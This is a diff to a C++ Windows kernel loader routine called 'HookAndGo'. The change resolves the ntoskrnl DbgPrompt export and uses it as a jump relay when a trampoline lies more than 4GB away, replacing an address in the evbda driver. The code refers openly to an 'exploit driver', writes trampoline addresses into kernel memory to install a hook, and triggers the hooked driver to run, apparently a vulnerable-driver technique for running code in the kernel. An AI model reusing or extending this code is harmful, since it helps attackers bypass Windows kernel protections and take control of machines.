@@ -381,6 +381,16 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	LdrCtx_SetKrnlBase(krnl_base);
 	LDRLog(L"ntoskrnl base=0x%p\n", krnl_base);
 
+	// Resolve nt!DbgPrompt address (used as PIT relay when distance > 4GB)
+	DWORD dbg_prompt_offset = 0;
+	if (!PE_GetExportOffset("C:\\Windows\\System32\\ntoskrnl.exe", DBG_EXPORT_FUNC, &dbg_prompt_offset)) {
+		LDRLog(L"failed to find DbgPrompt export in ntoskrnl.exe\n");
+	}
+	else {
+		LdrCtx_SetDbgPromptAbsAddr((PVOID)((DWORD64)krnl_base + dbg_prompt_offset));
+		LDRLog(L"DbgPrompt addr=0x%p (ntoskrnl base + 0x%x)\n", LdrCtx_GetDbgPromptAbsAddr(), dbg_prompt_offset);
+	}
+
 	// Get exploit driver base
 	PVOID exp_base = NULL;
 	st = KRNL::GetDriverBase(g_exp_driver_name, &exp_base);
@@ -470,10 +480,6 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 			return FALSE;
 		}
 
-		// Set PIT relay address: evbda_base + BaseOfCode + EVBDA_PIT_RELAY_OFFSET
-		PVOID pit_relay = (PVOID)((DWORD64)evbda_base + evbda_base_of_code + EVBDA_PIT_RELAY_OFFSET);
-		LdrCtx_SetPitRelayAddr(pit_relay);
-		LDRLog(L"PIT relay addr=0x%p (evbda base + 0x%x + 0x%x)\n", pit_relay, evbda_base_of_code, EVBDA_PIT_RELAY_OFFSET);
 		std::wstring w_source_sys_path(source_sys_path, source_sys_path + strlen(source_sys_path));
 		DWORD source_base_of_code = 0;
 		if (!PE_GetCodeSectionStartOffset(w_source_sys_path, source_base_of_code)) {
@@ -720,13 +726,13 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 
 	DWORD64 trampoline_pit = 0;
 	if (distance > 0xFFFFFFFF) {
-		LDRLog(L"distance exceeds 4GB, using evbda PIT relay\n");
-		if (!LdrCtx_GetPitRelayAddr()) {
-			LDRLog(L"PIT relay not set, cannot install hook\n");
+		LDRLog(L"distance exceeds 4GB, using DbgPrompt as PIT relay\n");
+		if (!LdrCtx_GetDbgPromptAbsAddr()) {
+			LDRLog(L"DbgPrompt not resolved, cannot install hook\n");
 			return FALSE;
 		}
-		trampoline_pit = (DWORD64)LdrCtx_GetPitRelayAddr();
-		LDRLog(L"write trampoline_addr to PIT relay at 0x%llX\n", trampoline_pit);
+		trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
+		LDRLog(L"write trampoline_addr to DbgPrompt PIT at 0x%llX\n", trampoline_pit);
 	}
 	else {
 		trampoline_pit = (DWORD64)tramp_base + stage_2_func_offset + TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC;
@@ -871,7 +877,7 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 				}
 			}
 		}
-	 
+		__debugbreak();
 	// Trigger the hooked driver to execute
 	if (!g_kpTable->TriggerExecute()) {
 		LDRLog(L"TriggerExecute failed\n");
